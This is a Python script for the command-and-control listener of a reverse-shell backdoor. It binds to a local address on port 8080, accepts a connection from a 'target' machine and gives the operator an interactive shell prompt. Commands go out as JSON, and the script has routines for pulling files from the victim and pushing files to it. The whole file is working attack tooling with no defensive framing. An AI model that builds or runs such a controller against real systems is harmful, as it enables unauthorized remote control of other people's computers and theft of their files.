import socket
import json
import os


def target_communication():
    while True:
        command = input('* Shell~%s >> ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            print('[+] Changing directory to ', command[3:])
        elif command == 'clear':
            os.system(command)
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("192.168.5.128", 8080))
print('[+] Listening for Incoming Connection')
sock.listen(5)
target, ip = sock.accept()
print('[+] Got connection from: ', ip)
target_communication()
